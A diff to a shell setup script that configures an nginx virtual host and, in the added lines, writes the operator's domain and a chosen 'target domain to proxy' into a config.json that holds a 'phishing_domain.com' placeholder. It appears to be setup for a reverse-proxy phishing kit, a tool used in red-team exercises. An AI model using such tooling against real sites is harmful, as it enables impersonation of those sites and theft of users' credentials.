@@ -57,5 +57,17 @@ sudo ln -s "$outfile" "/etc/nginx/sites-enabled/$fulldomain.conf"
 echo "Creating vhosts directory for nginx logs..."
 sudo mkdir -p "$vhostlogpath"
 if [ -f $outfile ]; then echo "Wrote nginx config to $outfile"; else echo "Could not find $outfile"; exit 5; fi
+
+echo "Updating config.json..."
+sed -i "s/phishing_domain.com/$fulldomain/g" ../config.json
+
+echo "Enter the target domain to proxy. E.g. \"google.com\""
+read -p "Target domain: " target
+if [ -z "$target" ]; then
+	echo "No target specified. Edit the config.json prior to running."
+else
+	sed -i "s/target1.com/$target/g" ../config.json
+fi
+echo "Updated critical components in config.json. Further edits can be done in the admin console or manually."
 echo "Ensure the vhost is correct and symlinked, then run: sudo systemctl restart nginx"
 echo "Thanks for playing!"
